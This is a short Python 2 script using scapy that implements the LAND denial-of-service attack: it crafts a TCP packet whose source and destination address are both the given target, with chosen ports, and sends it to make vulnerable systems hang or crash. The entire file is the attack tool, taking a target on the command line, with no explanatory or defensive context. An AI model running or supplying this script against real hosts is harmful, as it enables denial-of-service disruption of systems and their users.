from scapy.all import *
import sys, os

if len(sys.argv) != 4:
  print "Usage: python land.py <target> <sport> <dport>"
  exit()

target = sys.argv[1]
sp = int(sys.argv[2])
dp = int(sys.argv[3])

conf.L3socket
conf.L3socket=L3RawSocket

i = IP()
i.src = target
i.dst = target
t = TCP()
t.sport = sp
t.dport = dp
send(i/t)
 
